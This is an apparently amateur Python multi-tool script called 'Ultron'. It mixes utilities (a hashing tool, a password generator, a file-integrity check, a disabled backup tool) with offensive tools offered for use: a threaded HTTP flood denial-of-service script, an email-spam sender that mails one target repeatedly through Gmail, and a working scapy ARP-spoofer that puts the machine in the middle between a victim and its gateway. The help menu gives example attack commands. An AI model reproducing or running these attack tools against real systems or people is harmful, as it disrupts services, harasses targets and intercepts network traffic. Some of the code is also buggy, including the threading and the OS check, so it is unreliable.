#!/bin/python3
# Project with different tools
import sys
import threading
import os
import hashlib
import time
import shutil
import os.path
from datetime import datetime
import socket
import random
import re
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import filecmp
import scapy.all as scapy


class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'


def help_menu():
    print("""
    Welcome to:
    
     ▄▄   ▄▄ ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄ ▄▄    ▄
    █  █ █  █   █   █       █   ▄  █ █       █  █  █ █
    █  █ █  █   █   █▄     ▄█  █ █ █ █   ▄   █   █▄█ █
    █  █▄█  █   █     █   █ █   █▄▄█▄█  █ █  █       █
    █       █   █▄▄▄  █   █ █    ▄▄  █  █▄█  █  ▄    █
    █       █       █ █   █ █   █  █ █       █ █ █   █
    █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄█  █▄█▄▄▄▄▄▄▄█▄█  █▄▄█v1.0.4
    
    
    Powered by rysecx
    version 1.0.1

    usage:
        ./Ultron.py <tool> [features]
    tools/features:
            -i	integrity script:
                --src  [path to create integrity (optional)]
                --hf   [path of hash file (default: path of ultron)]
                --ha   [hash algorithm (sha256, sha512 | default: sha256)]
                --os   [windows or unix (not necessary at option --src)]
            -g	pwd-generator script:
                --n    [number of passwords to generate]
                --s    [security [min] [max] or manually setup password length]
            -d	DoS script:
                --t    [target]
                --p    [port]
                --th   [threads]
                --sp   [spoofed ip (optional)]
            -b  backup script:
                --src  [path to backup]
                --dst  [path to store backup]
                --ot   [onetime backup]
                --t    [time when to backup automatically]
                --r    [remove auto backup]
                --os   [windows or unix]
            -h  hashing script:
                --str  [string to hash]
                --f    [file to save hash (optional)]
                --i    [iterations (default:100)]
            -e  email-spam/automated-email script:
            	--a    [automated(time in s)]
            	--t    [target email]
            	--u    [user email]
                --pf   [file with password of user email]
            	--m    [message file]
            	--h    [heading1 & heading2]
                --c    [number of emails to spam]
            -a  arp-spoofer:
                --t    [select a target you want to spoof]
                --g    [select a second target you want to spoof (usually the gateway)]
                       Note: the used MAC-Address for spoofing is the system Ultron is running on

   examples:
	./Ultron.py -g --n 10 --s max
	./Ultron.py -d --t 192.168.0.1 --p 80 --th 700
    """)


def integrity_script(sourcePath, hashFile, hashAlgorithm, isOS):
    print("integrity_script is running...")

    def encrypt_string(hashString, hashAlgorithm):
        if hashAlgorithm == 0:
            shaSignature = hashlib.sha256(hashString.encode()).hexdigest()
        elif hashAlgorithm == "sha512":
            shaSignature = hashlib.sha512(hashString.encode()).hexdigest()
        else:
            print("invalid hash algorithm was taken --> default is used")
            shaSignature = hashlib.sha256(hashString.encode()).hexdigest()

        return shaSignature

    def get_size(dir1):
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(dir1):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                # skip if it is symbolic link
                if not os.path.islink(fp):
                    total_size += os.path.getsize(fp)
        return total_size

    def find(name, path):
        for root, dirs, files in os.walk(path):
            if name in files:
                return os.path.join(root, name)

    def write_file(hash_str, txt_path_):
        with open(txt_path_, "a") as f:
            f.write(hash_str)
        f.close()

    def file_exist(txt_file, txt_path, txt_path_):
        if find(txt_file, txt_path) == txt_path_:
            return True
        else:
            return False

    def hashing(isOS):

        digit1 = 0
        digit2 = 64
        single_hash = [str(0)] * 50
        txt_path_ = ""
        txt_path = ""
        txt_file = ""

        if sourcePath == 0:
            if isOS == "unix":
                # linux
                if hashFile == 0:
                    txt_path_ = os.getcwd() + "/hashes.txt"
                    txt_path = os.getcwd()
                    txt_file = "hashes.txt"
                else:
                    txt_path_ = hashFile
                dirs = ["/bin", "/boot", "/dev", "/etc", "/home", "/lib", "/lib64", "/mnt", "/opt", "/proc", "/root",
                        "/sbin", "/selinux", "/srv", "/sys", "/usr", "/var"]

            elif isOS == "windows" or "shit":
                # windows
                if hashFile == 0:
                    txt_path_ = os.getcwd() + "\\hashes.txt"
                    txt_path = os.getcwd()
                    txt_file = "hashes.txt"
                else:
                    txt_path_ = hashFile

                dirs = ["C:\\Windows\\System32", "C:\\Windows\\System"]
            else:
                print("invalid operating system!")
                sys.exit("shut down ultron ...")
        else:
            dirs = [sourcePath]
            if hashFile == 0:
                if isOS == "windows":
                    txt_path_ = os.getcwd() + "\\hash.txt"
                elif isOS == "unix":
                    txt_path_ = os.getcwd() + "/hash.txt"
                txt_path = os.getcwd()
                txt_file = "hash.txt"
            else:
                txt_path_ = hashFile

        # checking directory + hashing it
        if not file_exist(txt_file, txt_path, txt_path_):
            exist = False
            print("Hash file existing : [", colors.RED, "-", colors.WHITE, "]")
        else:
            print("Hash file existing : [", colors.GREEN, "+", colors.WHITE, "]")
            exist = True
        for i in range(len(dirs)):
            print("\r\n Checking directory ", dirs[i], end="\r")
            if os.path.exists(str(dirs[i])):
                print(" Checking directory ", dirs[i], " :   ", colors.GREEN, "done", colors.WHITE, end="\r")
                # extracting one hash from all file hashes
                try:
                    size = get_size(dirs[i])
                    if size > 0:
                        hash_string = str(size)
                        hash_str = encrypt_string(hash_string, hashAlgorithm)
                        for x in range(20):
                            hash_str = encrypt_string(hash_str, hashAlgorithm)
                        print("\r\n Created hash from  ", dirs[i], " : ", colors.GREEN, "  done            ",
                              colors.WHITE, hash_str)
                        if not exist:
                            write_file(hash_str, txt_path_)
                            exist = False
                        else:
                            pass

                        # comparing hashes
                        with open(txt_path_, "r") as f:
                            hashes = f.read()
                        f.close()
                        single_hash[i] = hashes[digit1:digit2]
                        print(" Comparing hashes ", dirs[i], " ... ", end="\r")
                        if single_hash[i] == hash_str:
                            print(" Comparing hashes   ", dirs[i], " : ", colors.GREEN, "verified", colors.WHITE)
                        else:
                            print(" Comparing hashes   ", dirs[i], " : ", colors.RED, "unverified        ",
                                  colors.WHITE, single_hash[i])
                        digit1 += 64
                        digit2 += 64

                    else:
                        print(colors.YELLOW, "\r\n WARNING : creating specific hash failed (empty directory)",
                              colors.WHITE)
                        hash_str = "a" * 64
                        print(" Default hash       ", dirs[i], " :                      ", hash_str)
                        if not exist:
                            write_file(hash_str, txt_path_)
                            exist = False
                        else:
                            pass
                        with open(txt_path_, "r") as f:
                            hashes = f.read()
                        f.close()
                        single_hash[i] = hashes[digit1:digit2]
                        print(" Comparing hashes ", dirs[i], " ... ", end="\r")
                        if single_hash[i] == hash_str:
                            print(" Comparing hashes   ", dirs[i], " : ", colors.GREEN, "verified", colors.WHITE)
                        else:
                            print(" Comparing hashes   ", dirs[i], " : ", colors.RED, "unverified          ",
                                  colors.WHITE, single_hash[i])
                        digit1 += 64
                        digit2 += 64
                except FileNotFoundError:
                    print(colors.RED, "\r\n FATAL ERROR : creating hash failed (empty directory)", colors.WHITE)
                    pass
                except PermissionError:
                    print(colors.RED, "\r\n FATAL ERROR: permission denied")
                    pass

            else:
                failed = "failed"
                print(" Checking directory ", dirs[i], " ... ", colors.RED + failed + colors.WHITE)
    try:
        hashing(isOS)

    except Exception as er:
        print(er)
        sys.exit()

    print("Checking integrity ...", colors.GREEN, "done", colors.WHITE)


def dos_script(target, port, threads, fake_ip):
    # checking args
    if target == 0:
        print("no target selected")
        sys.exit()
    elif port == 0:
        port = 80
    elif threads == 0:
        threads = 500
    elif fake_ip == 0:
        fake_ip = "134.128.12.32"
    else:
        pass

    def countdown(c):
        time.sleep(1)
        print("DoS attack starts in", c, "s", end="\r")

    print("-" * 50)
    print("DoS script by John Ryder. v.1.0.1")
    print("Target : ", target)
    print("Port: ", port)
    print("Threads: ", threads)
    print("Datetime: ", str(datetime.now()))
    print("-" * 50)
    print(" ")
    c = 3
    for x in range(4):
        countdown(c)
        c -= 1
    def attack(already_connected, failed_conn):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                s.close()
                already_connected += 1
                con = str(already_connected)
                print(" (", con, ") requests sent to target.", end="\r")

            except KeyboardInterrupt:
                print(50 * " ")
                sys.exit()
            except socket.error:
                failed_conn += 1
                print(" (", failed_conn, ") connections failed!", end="\r")
            except NameError:
                print("")

    threads = int(threads)
    port = int(port)
    already_con = 0
    failed_con = 0
    for i in range(threads):
        thread = threading.Thread(target=attack(already_con, failed_con))
        thread.start()


def hash_script(hashString, hashFile, hashIter):

    print("hash_script is running ...")
    hashIter = int(hashIter)

    def encrypt_string(hash_string):
        sha_signature = hashlib.sha256(hash_string.encode()).hexdigest()
        return sha_signature

    if hashIter == 0:
        hashIter = 100
    else:
        pass
    for x in range(hashIter):
        hashString = encrypt_string(hashString)

    print("created hash : ", hashString)

    if hashFile == 0:
        pass
    else:
        with open(hashFile, "w") as f:
            f.write(hashString)
        f.close()
        print("saved hash to file   [", colors.GREEN, "+", colors.WHITE, "]")


def gen_script(pwdNumbers, securityLevel):
    # array declarations
    upperCase = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
                 "U", "V", "W", "X", "Y", "Z"]
    lowerCase = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                 "u", "v", "w", "x", "y", "z"]
    nNumbers = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    specialChars = ["\"", "{", "}", ".", ",", ";", "/", "\\", "<", ">", "=", "[", "]", "^", "~", "_",
                    "|", "%", "&", "'", "`", "@", "*", "-", "#", "+", "$", "!", ":", "?"]
    specialChars0 = ["*", "-", "#", "+", "$", "!", ":", "?"]

    pwdNumbers = int(pwdNumbers)
    if pwdNumbers == 0:
        pwdNumbers = 1
    else:
        pass

    x = re.search("^[1-9][0-9]*$", securityLevel)
    sLevel = 0
    if securityLevel == 0:
        securityLevel = 15
        sLevel = 1
    elif securityLevel == "min":
        securityLevel = 15
        sLevel = 1
    elif securityLevel == "max":
        securityLevel = 30
    elif x is not None:
        securityLevel = int(securityLevel)
        sLevel = 0
    else:
        print(colors.RED, "Error: wrong security input\r\n", colors.WHITE )
        print("default [min] selected\r\n")
        securityLevel = 15
        sLevel = 1

    for x in range(pwdNumbers):
        if sLevel == 1:
            password = ""
            for i in range(securityLevel):
                r1 = random.randint(1, 4)
                if r1 == 1:
                    r2 = random.randint(0, 25)
                    password += upperCase[r2]
                elif r1 == 2:
                    r2 = random.randint(0, 25)
                    password += lowerCase[r2]
                elif r1 == 3:
                    r2 = random.randint(0, 9)
                    password += nNumbers[r2]
                elif r1 == 4:
                    r2 = random.randint(0, 7)
                    password += specialChars0[r2]
                else:
                    print(colors.RED, "Error: ", colors.WHITE, "could not generate random number")
                    sys.exit("\r\n")

            print("password generated:  [", colors.BLUE, password, colors.WHITE, "]")

        elif sLevel == 0:
            password = ""
            for i in range(securityLevel):
                r1 = random.randint(1, 4)
                if r1 == 1:
                    r2 = random.randint(0, 25)
                    password += upperCase[r2]
                elif r1 == 2:
                    r2 = random.randint(0, 25)
                    password += lowerCase[r2]
                elif r1 == 3:
                    r2 = random.randint(0, 9)
                    password += nNumbers[r2]
                elif r1 == 4:
                    r2 = random.randint(0, 28)
                    password += specialChars[r2]
                else:
                    print(colors.RED, "Error: ", colors.WHITE, "could not generate random number")
                    sys.exit("\r\n")

            print("password generated:  [", colors.BLUE, password, colors.WHITE, "]")

        else:
            print(colors.RED, "Error: ", colors.WHITE, "could not generate password")
            sys.exit("\r\n")

    # print("\r\npassword generation:   [", colors.GREEN, "+", colors.WHITE, "]\r\n", colors.WHITE)


def backup_script(dir1, dir2):
    print("backup.py is running...")

    def copytree():
        src = dir1
        dst = dir2
        try:
            print("This might take a long time. Be patient.")
            shutil.copytree(src, dst)
            #  shutil.copytree(src, ds, dis_exist_ok=True)

        except KeyboardInterrupt:
            print("Script shut down...")
            sys.exit()

        except shutil.Error:
            print("shutil_module_error. (probably permission denied file)                            ")
            end_check()
            sys.exit()

        except OSError:
            print("some files may be unable to copy. (crashed files)                ")
            pass

    def get_size():
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(dir1):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                # skip if it is symbolic link
                if not os.path.islink(fp):
                    total_size += os.path.getsize(fp)
        return total_size

    def analyze_p():
        files1 = 0
        dirs1 = 0
        files2 = 0
        dirs2 = 0
        for base, dirs, files in os.walk(dir1):
            for directories in dirs:
                dirs1 += 1
            for Files in files:
                files1 += 1
        for base, dirs, files in os.walk(dir2):
            for directories in dirs:
                dirs2 += 1
            for Files in files:
                files2 += 1
        return files1, dirs1, files2, dirs2

    def size_def(size_src, size_dst):
        if size_src > 1024:
            # kilobyte
            size_src = size_src / 1024
            size_s = "KB"
            if size_src >= 1000:
                # megabyte
                size_src /= 1000
                size_s = "MB"
                if size_src >= 1000:
                    # gigabyte
                    size_src /= 1000
                    size_s = "GB"
                    if size_src >= 1000:
                        # terabyte
                        size_src /= 1000
                        size_s = "TB"
                    else:
                        pass
                else:
                    pass
            else:
                pass
        else:
            size_s = "byte"
        if size_dst > 1024:
            # kilobyte
            size_dst /= 1024
            size_d = "KB"
            if size_dst >= 1000:
                # megabyte
                size_dst /= 1000
                size_d = "MB"
                if size_dst >= 1000:
                    # gigabyte
                    size_dst /= 1000
                    size_d = "GB"
                    if size_dst >= 1000:
                        # terabyte
                        size_dst /= 1000
                        size_d = "TB"
                    else:
                        pass
                else:
                    pass
            else:
                pass
        else:
            size_d = "byte"

        return size_src, size_s, size_dst, size_d

    def r_process():
        finished = False
        file_d1, dirs_1, file_d2, dirs_2 = analyze_p()
        og_size_dst = get_size()
        while not finished:
            finished = compare_trees()
            file1_d1, dirs1, file2_d2, dirs2 = analyze_p()
            size_src = get_size()
            size_dst = get_size() - og_size_dst
            file2_d2 = file2_d2 - file_d2
            size_src, size_s, size_dst, size_d = size_def(size_src, size_dst)

            if not finished:
                if file1_d1 >= file2_d2:
                    print("Copy files(", file2_d2, "/", file1_d1, ")", "|", "(", "%.2f" % size_dst, size_d, "/",
                          "%.2f" % size_src, size_s, ")        ", end="\r")
                else:
                    dot1 = ".                                   "
                    dot2 = "..                                  "
                    dot3 = "...                                 "
                    print("Copy files ", dot1, "     ", end="\r")
                    time.sleep(0.2)
                    print("Copy files ", dot2, "   ", end="\r")
                    time.sleep(0.2)
                    print("Copy files ", dot3, end="\r")

            elif finished:
                print("Copy files(", file2_d2, "/", file1_d1, ")", "|", "(", "%.2f" % size_src, size_s, "/",
                      "%.2f" % size_src, size_s, ")       ", end="\r")
                print("\r\nDone.")

            else:
                print("An error occurred.")
                sys.exit()

    def compare_trees():
        file1_d1, dirs1, file2_d2, dirs2 = analyze_p()
        size_src = get_size()
        size_dst = get_size()

        dirs_cmp = filecmp.dircmp(dir1, dir2)
        if len(dirs_cmp.left_only) > 0 or len(dirs_cmp.right_only) > 0 or \
                len(dirs_cmp.funny_files) > 0 or file1_d1 != file2_d2 or size_src != size_dst:
            return False
        else:
            return True

    def are_dir_trees_equal():
        print("Analysing paths...")
        file1_d1, dirs1, file2_d2, dirs2 = analyze_p()
        size_src = get_size()
        size_dst = get_size()
        try:
            if not compare_trees():
                if file1_d1 == file2_d2 and size_src != size_dst:
                    print("Backup necessary.")
                    copy_files()

                elif file1_d1 != file2_d2 and size_src != size_dst:
                    print("Backup necessary.")
                    copy_files()
                
                elif file1_d1 == 0 and file2_d2 == 0:
                    print("Nothing to copy.")
                    sys.exit()

                else:
                    print("ERROR: Paths might be corrupted.")
                    sys.exit()

            else:
                print("Paths already equal. No backup necessary.")
                sys.exit()

        except FileNotFoundError:
            print("ERROR: Selected file or directory not found.")
            sys.exit()

        except FileExistsError:
            print("ERROR: Selected file or directory doesn't exist.")
            sys.exit()

        except OSError:
            print("Some files may be unable to copy. (damaged files)")
            sys.exit()

        end_check()

    def end_check():
        print("Checking files...")
        if compare_trees():
            print("Files copied successfully.")
            sys.exit()
        else:
            print("Some files/metafiles failed to copy. Retry script, otherwise check manual if all files were copied.")
            sys.exit()

    def copy_files():
        dirs_cmp = filecmp.dircmp(dir1, dir2)
        try:
            file1_d1, dirs1, file2_d2, dirs2 = analyze_p()

            if len(dirs_cmp.left_only) == 0:
                print("No files to copy.")
                sys.exit()
            elif len(dirs_cmp.left_only) > 0 or len(dirs_cmp.right_only) > 0 or \
                    len(dirs_cmp.funny_files) > 0 or file1_d1 != file2_d2:
                thread1 = threading.Thread(target=r_process)
                thread2 = threading.Thread(target=copytree)
                thread1.start()
                thread2.start()
                thread1.join()
                thread2.join()
            else:
                print("No backup necessary")
                sys.exit()

        except shutil.Error:
            print("shutil_module_error. (probably permission denied file)                            ")
            end_check()
            sys.exit()

        except OSError:
            print("ERROR: fatal python error.")
            sys.exit()

        size_src = get_size()
        size_dst = get_size()
        size_src, size_s, size_dst, size_d = size_def(size_src, size_dst)
        file1_d1, dirs1, file2_d2, dirs2 = analyze_p()
        print("-" * 50)
        print("Script by John Ryder v1.0.2")
        print("Datetime: ", str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        print("Number of files", sys.argv[3], ": ",
              file1_d1, "| (", "%.2f" % size_src, size_s, ")")
        print("Number of files", sys.argv[5], ": ",
              file2_d2, "| (", "%.2f" % size_dst, size_d, ")")
        print("-" * 50)

    are_dir_trees_equal()

def send_email(auTime, eCount, targetEmail, userEmail, crFile, msgFile, header1, header2):

    if (auTime == 0 or eCount == 0 or targetEmail == 0 or userEmail == 0 or crFile == 0 or msgFile == 0 or header1 == 0 or header2 == 0):
        print(colors.RED, "ERROR: input invalid. try -help for usage", colors.WHITE)
        sys.exit()
    else:
        pass

    print("mail_script is running ...\r\n")

    with open(crFile, 'r') as f:
        password = f.read()

    print("Connecting to gmail-server ...", end="\r")
    try:
        server = smtplib.SMTP('smtp.gmail.com', 25)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(str(userEmail), str(password)) 
    except Exception as e:
        print(colors.RED, "ERROR: ", e, colors.WHITE)
        print("\r\nConnecting to gmail-server [", colors.RED, "failed", colors.WHITE, "]\r\n") 
        sys.exit()
    print("Connecting to gmail-server [", colors.GREEN, "done", colors.WHITE, "]\r\n") 

    msg = MIMEMultipart()
    msg['From'] = str(header1)
    msg['To'] = str(targetEmail)
    msg['Subject'] = str(header2)

    with open(msgFile, 'r') as f:
        message = f.read()
    
    msg.attach(MIMEText(message, 'plain'))

    text = msg.as_string()
    print(f'Timeinterval setup to {str(auTime)} seconds.')
    for x in range(int(eCount)):
        try:   
            server.sendmail(str(userEmail), str(targetEmail), text)
        except Exception as e:
            print(colors.RED, "ERROR: ", e, colors.WHITE)
            server.quit()
        except KeyboardInterrupt():
            server.quit()
            sys.exit("^C")
        print("Email sent [", colors.GREEN, "+", colors.WHITE, "] | (", x+1, "/", eCount, ")",end="\r")
            
        time.sleep(int(auTime))
        header2 += "-"
        msg = MIMEMultipart()
        msg['From'] = str(header1)
        msg['To'] = str(targetEmail)
        msg['Subject'] = str(header2)
        msg.attach(MIMEText(message, 'plain'))
        text = msg.as_string()

    print("\r\nJob done. Quitting server.")
    server.quit()

def update_db():
    print("Updating db ...",end="\r")
    try: 
        shutil.copy("Ultron.py", "/run/media/ryx/Volume/hacking/projects/")
    except Exception as e:
        print("Updating db [", colors.RED, "failed", colors.WHITE, "]")
        print(colors.RED, "ERROR.", e , colors.WHITE)
        sys.exit()
    x1 = os.path.getsize("Ultron.py")
    x2 = os.path.getsize("/run/media/ryx/Volume/hacking/projects/Ultron.py")
    if x1 == x2:
        print("Update db [", colors.GREEN, "done", colors.WHITE, "]")
    else:
        print("Updating db [", colors.RED, "failed", colors.WHITE, "]")

def arp_spoof(targetIP1, targetIP2):
    def get_mac(ip):
    # function that returns the mac address of the desired IP address
    # creating an ARP-request out of the desired IP
        arpRequest = scapy.ARP(pdst = ip)
        # setting broadcast mac address
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        # join these into a single packet
        arpRequestBroadcast = broadcast / arpRequest
        # srp returns two lists of IP addresses that responded and not responded to the package
        answeredList = scapy.srp(arpRequestBroadcast, timeout = 5, verbose = False)[0]
        # the mac address which responded is stored in the hwsrc field of scapy
        return answeredList[0][1].hwsrc

    def spoof(targetIP, spoofIP):
        # ARP-spoofing 
        # packet which modifies the arp table of two devices --> usually the target and the gateway
        # 
        packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = get_mac(targetIP), psrc = spoofIP)
        scapy.send(packet, verbose = False)

    def restore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip, 
                                hwdst = destination_mac, 
                    psrc = source_ip, hwsrc = source_mac)
    
        scapy.send(packet, verbose = False)
    packetCount = 0
    try:
        while True:
            spoof(targetIP1, targetIP2)
            spoof(targetIP2, targetIP1)
            packetCount += 1
            print(f'sent spoofed packets [{packetCount}] to {targetIP2} | sent spoofed packets [{packetCount}] to {targetIP1}')
            time.sleep(2)
    except KeyboardInterrupt:
        print('^C. cleaning arp-tables up')
        restore(targetIP2, targetIP1)
        print(f'restoring OG-MAC from {targetIP2}')
        restore(targetIP1, targetIP2)
        print(f'restoring OG-MAC from {targetIP1}')
        sys.exit()

    
def ultron():
    # print("\r\nstatus:  Ultron is running  [", colors.GREEN, "+", colors.WHITE, "]")
    print("fetching args ... ", end="\r")

    def fetch_done():
        print("fetching args    [", colors.GREEN, "done", colors.WHITE, "]")

    def fetch_failed():
        print("fetching args    [", colors.RED, "failed", colors.WHITE, "]")
        print("for exact usage try -help")
    
    def ultron_done():
        print("\r\nUltron shut down.\r\n")

    # args algorithm
    if len(sys.argv) == 1:
        fetch_done()
        help_menu()
    elif sys.argv[1] in ("--updatedb", "-a", "-i", "-h", "-g", "-d", "-p", "-b", "-e", "-ph", "-t", "-ip", "-xss", "-help"):
        if sys.argv[1] == "-help":
            fetch_done()
            help_menu()
        elif sys.argv[1] == "-i":
            wordList = ["--src", "--ha", "--hf", "--os"]
            argsArray = [0, 0, 0, 0]
            # declare Args
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[1]:
                    argsArray[1] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[2]:
                    argsArray[2] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[3]:
                    argsArray[3] = sys.argv[i + 1]
                else:
                    pass
            fetch_done()
            try:
                integrity_script(argsArray[0], argsArray[1], argsArray[2], argsArray[3])
            except KeyboardInterrupt:
                sys.exit("\r\n^C")

        elif sys.argv[1] == "-d":
            wordList = ["--t", "--p", "--th", "--sp"]
            argsArray = [0, 0, 0, 0]
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = socket.gethostbyname(sys.argv[i + 1])
                elif sys.argv[i] == wordList[1]:
                    argsArray[1] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[2]:
                    argsArray[2] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[3]:
                    argsArray[3] = sys.argv[i + 1]
                else:
                    pass
            fetch_done()
            try:
                dos_script(argsArray[0], argsArray[1], argsArray[2], argsArray[3])
            except KeyboardInterrupt:
                sys.exit("\r\n")

        elif sys.argv[1] == "-h":
            wordList = ["--str", "--f", "--i"]
            argsArray = [0, 0, 0]
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[1]:
                    print(colors.RED, "Sorry. The file feature --f is currently not available.", colors.WHITE)
                    sys.exit()
                    # argsArray[1] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[2]:
                    argsArray[2] = sys.argv[i + 1]
                else:
                    pass
            fetch_done()
            try:
                hash_script(argsArray[0], argsArray[1], argsArray[2])
            except KeyboardInterrupt:
                sys.exit("\r\n")

        elif sys.argv[1] == "-g":
            wordList = ["--n", "--s"]
            argsArray = [0, 0]
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[1]:
                    argsArray[1] = sys.argv[i + 1]
                else:
                    pass
            fetch_done()
            try:
                gen_script(argsArray[0], argsArray[1])
            except KeyboardInterrupt:
                sys.exit("\r\n")

        elif sys.argv[1] == "-a":
            wordList = ["--t", "--g"]
            argsArray = [0, 0]
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[1]:
                    argsArray[1] = sys.argv[i + 1]
                else:
                    pass
            fetch_done()
            try:
                arp_spoof(argsArray[0], argsArray[1])
            except KeyboardInterrupt:
                sys.exit("\r\n")
        
        elif sys.argv[1] == "-e":
            wordList = ["--a", "--c", "--t", "--u", "--pf", "--m", "--h"]
            argsArray = [0, 0, 0, 0, 0, 0, 0, 0]
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[1]:
                    argsArray[1] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[2]:
                    argsArray[2] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[3]:
                    argsArray[3] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[4]:
                    argsArray[4] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[5]:
                    argsArray[5] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[6]:
                    argsArray[6] = sys.argv[i + 1]
                    argsArray[6] += sys.argv[i + 2]
                    argsArray[7] = sys.argv[i + 3]
                else:
                    pass
                
            fetch_done()
            try:
                send_email(argsArray[0], argsArray[1], argsArray[2], argsArray[3], argsArray[4],
                argsArray[5], argsArray[6], argsArray[7])
                ultron_done
            except KeyboardInterrupt:
                sys.exit("\r\n")
        
        elif sys.argv[1] == "-b":
            print(colors.RED, "Sorry the backup tool is still in development and currently not available.\r\n", colors.WHITE)
            """wordList = ["--src", "--dst"]
            argsArray = [0, 0]
            for i in range(len(sys.argv)):
                if sys.argv[i] == wordList[0]:
                    argsArray[0] = sys.argv[i + 1]
                elif sys.argv[i] == wordList[1]:
                    argsArray[1] = sys.argv[i + 1]
                else:
                    pass
            fetch_done()
            
            try:
                backup_script(argsArray[0], argsArray[1])
            except KeyboardInterrupt:
                sys.exit("\r\n")
            """
        elif sys.argv[1] == "--updatedb":
            update_db()

        else:
            fetch_failed()
            sys.exit()
    else:
        fetch_failed()
        sys.exit()


try:
    ultron()

except Exception as e:
    print(colors.RED, "ERROR:", e, colors.WHITE)







